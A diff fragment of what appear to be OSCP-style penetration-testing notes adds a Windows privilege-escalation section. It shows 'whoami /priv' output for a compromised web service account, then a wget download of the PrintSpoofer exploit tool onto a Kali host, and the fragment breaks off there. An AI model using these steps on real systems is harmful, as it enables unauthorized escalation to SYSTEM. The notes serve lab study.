@@ -283,6 +283,24 @@ C:\Windows\system32> whoami nt authority\system
 ```
 
 ## Windows Privilege Escalation
+
+```
+oscp\web_svc@MS01 C:\Users\web_svc>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State        
+============================= ==================================== =======      
+SeShutdownPrivilege           Shut down the system                 Enabled      
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled      
+SeUndockPrivilege             Remove computer from docking station Enabled      
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled      
+SeTimeZonePrivilege           Change the time zone                 Enabled      
+
+
+```
+PrintSpoofer
 ```
 kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
 
